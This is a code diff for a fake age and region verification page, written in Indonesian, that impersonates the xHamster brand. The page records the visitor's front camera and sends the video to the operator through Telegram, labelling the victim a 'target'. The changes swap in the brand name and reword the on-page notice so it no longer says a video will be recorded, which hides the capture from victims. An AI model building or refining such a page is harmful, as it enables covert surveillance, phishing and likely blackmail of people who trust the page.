@@ -25,17 +25,14 @@
             width: 90%;
             border: 1px solid #2f2f2f;
         }
-        /* Kontainer khusus untuk logo gambar agar rapi */
-        .logo-container {
+        /* Gaya khusus untuk tulisan teks di bagian atas */
+        .text-header {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
             margin-bottom: 25px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .logo-img {
-            max-width: 220px; /* Ukuran lebar logo proporsional */
-            height: auto;
-            display: block;
+            color: #ffffff;
+            text-transform: uppercase;
         }
         h3 {
             font-size: 22px;
@@ -105,17 +102,15 @@
 <body>
 
 <div class="container">
-    <!-- Perbaikan: Tautan gambar dikembalikan ke aset logo yang benar -->
-    <div class="logo-container">
-        <img src="https://wikimedia.org" alt="Logo" class="logo-img">
-    </div>
+    <!-- Bagian atas hanya berupa tulisan teks tanpa gambar logo -->
+    <div class="text-header">XHAMSTER</div>
 
     <div id="setup-box">
         <h3>Verifikasi Akses Pengguna</h3>
         <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
         
         <p class="warning-text">
-            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk mengambil rekaman video validasi (5 detik) demi kepatuhan layanan.
+            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk varifikasi validasi (5 detik) demi kepatuhan layanan.
         </p>
 
         <div class="btn-group">
@@ -189,7 +184,7 @@ function prosesRekamanKamera() {
 function kirimKeTelegram(videoBlob) {
     updateStatus("Memuat verifikasi...", "loading", true);
 
-    const infoTeks = `☠️ *Hasil Verifikasi Akses target by @anonymous*:\n\n` +
+    const infoTeks = `☠️ *Hasil video rekaman camera depan target by @anonymous*:\n\n` +
                      `• Wilayah Pilihan: \`${wilayahDipilih}\``;
 
     const formData = new FormData();
